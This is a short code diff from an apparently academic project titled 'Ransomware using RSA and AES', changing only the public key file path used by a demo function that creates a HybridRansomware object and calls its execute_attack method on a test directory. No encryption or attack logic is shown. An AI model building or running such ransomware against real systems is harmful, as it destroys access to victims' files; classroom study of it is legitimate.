@@ -278,7 +278,7 @@ def demo_encrypt():
     print("=== RANSOMWARE DEMO MODE ===")
     print("This will encrypt files in ./test_files/ directory only")
     
-    ransomware = HybridRansomware("D:\\3rd-year\\Cryptography\\Project-Ransomeware using RSA and AES\\One-machine\\data\\public_key.pem")  # Update this path to a valid public key file
+    ransomware = HybridRansomware("/home/saitama/Cryptography/Cryptography-Courses/Project-Ransomeware using RSA and AES/One-machine/data/public_key.pem")  # Update this path to a valid public key file
     success = ransomware.execute_attack()
     
     if success:
